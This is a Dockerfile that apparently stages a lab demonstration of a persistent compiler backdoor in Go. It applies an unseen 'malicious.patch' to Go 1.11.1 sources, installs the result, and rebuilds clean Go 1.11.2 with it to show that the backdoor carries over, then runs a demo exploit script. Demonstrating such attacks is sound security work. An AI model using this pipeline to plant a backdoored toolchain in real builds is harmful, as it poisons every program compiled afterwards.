FROM ubuntu:focal

# Define environment variables for Go versions
ENV GO_VERSION_BOOTSTRAP=1.11
ENV GO_VERSION_ATTACK_1=1.11.1
ENV GO_VERSION_ATTACK_2=1.11.2

RUN mkdir -p /exploit /exploit/go
COPY malicious.patch /exploit
COPY login.go /exploit
COPY demo_exploit.sh /exploit
COPY install_malicious_go_compiler.sh /exploit

# install packages
RUN apt-get update && apt-get install -yq --no-install-recommends --force-yes \
    wget ca-certificates patch gcc-multilib

# install benign Go compiler
RUN wget https://go.dev/dl/go${GO_VERSION_BOOTSTRAP}.linux-amd64.tar.gz && \
    rm -rf /usr/local/go && \
    tar -C /usr/local -xzf go${GO_VERSION_BOOTSTRAP}.linux-amd64.tar.gz && \
    rm go${GO_VERSION_BOOTSTRAP}.linux-amd64.tar.gz

ENV PATH=$PATH:/usr/local/go/bin

# download new version of Go compiler sources
WORKDIR /exploit
RUN wget https://go.dev/dl/go${GO_VERSION_ATTACK_1}.src.tar.gz && \
    tar -xzf go${GO_VERSION_ATTACK_1}.src.tar.gz && \
    rm go${GO_VERSION_ATTACK_1}.src.tar.gz

# apply malicious patch to Go sources
WORKDIR /exploit/go
RUN patch -p1 < ../malicious.patch

# compile malicious Go sources with clean bootstrap
WORKDIR /exploit/go/src
RUN ./make.bash

RUN ls -la /exploit/go && \
    [ -f /exploit/go/bin/go ] || (echo "Go binary not found" && exit 1)

# replace the clean Go compiler with the malicious one
RUN rm -rf /usr/local/go/ && \
    mv /exploit/go/ /usr/local/go

# use the malicious Go compiler to compile clean Go sources, resulting in a malicious compiler again
WORKDIR /exploit
RUN rm -rf go go${GO_VERSION_ATTACK_1}.src.tar.gz && \
    wget https://go.dev/dl/go${GO_VERSION_ATTACK_2}.src.tar.gz && \
    tar -xzf go${GO_VERSION_ATTACK_2}.src.tar.gz && \
    rm go${GO_VERSION_ATTACK_2}.src.tar.gz

WORKDIR /exploit/go/src
RUN ./make.bash

RUN ls -la /exploit/go && \
    [ -f /exploit/go/bin/go ] || (echo "Go binary not found" && exit 1)

# replace the first malicious Go compiler with the new malicious compiler (showing persitence across versions)
RUN rm -rf /usr/local/go/ && \
    mv /exploit/go/ /usr/local/go

WORKDIR /exploit/
RUN chmod +x /exploit/demo_exploit.sh /exploit/install_malicious_go_compiler.sh

# entrypoint executes the exploit (compile malicious version of clean sources)
CMD ["bash", "-c", "/exploit/demo_exploit.sh"]
